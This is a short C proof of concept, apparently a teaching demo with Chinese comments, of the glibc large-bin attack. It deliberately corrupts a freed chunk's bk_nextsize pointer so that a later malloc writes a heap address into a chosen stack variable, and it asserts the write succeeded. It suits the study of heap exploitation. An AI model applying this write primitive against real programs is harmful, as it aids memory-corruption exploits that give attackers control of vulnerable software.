#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    size_t target = 0;
    size_t target1 = 0;
    size_t target2 = 0;
    size_t target3 = 0;
    size_t target4 = 0;
    size_t target5 = 0;
    size_t *p1 = malloc(0x428); // allocate large chunk
    size_t *g1 = malloc(0x18); // prevent consolidate

    size_t *p2 = malloc(0x418); // second large chunk，但是要小於第一塊的大小 && 屬於同個 large bin
    size_t *g2 = malloc(0x18); // prevent consolidate

    free(p1); // free 第一塊
    size_t *g3 = malloc(0x438); // allocate 大於 p1 的 chunk，因此 p1 會進到 large bin

    free(p2); // 目前在 unsorted bin

    // ! vuln
    // 篡改 largebin chunk 的 bk_nextsize 成 target - 0x20
    p1[3] = (size_t)((&target) - 4);

    /*
    size: 0x420
    chunksize_nomask (bck->bk): 0x430
    bck: main_arena
    bck->bk: p1

    if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
        fwd = bck; // fwd = main_arnea
        bck = bck->bk; // bck == p1
        victim->fd_nextsize = fwd->fd; // victim->fd_nextsize = p1
        victim->bk_nextsize = fwd->fd->bk_nextsize; // victim->fd_nextsize = target - 0x20
        fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; // p1->bk_nextsize = target = victim
    }
    */
    size_t *g4 = malloc(0x438); // allocate 大於 p2 的 chunk，因此 p2 會進到 large bin

    assert((size_t)(p2 - 2) == target);
    return 0;
}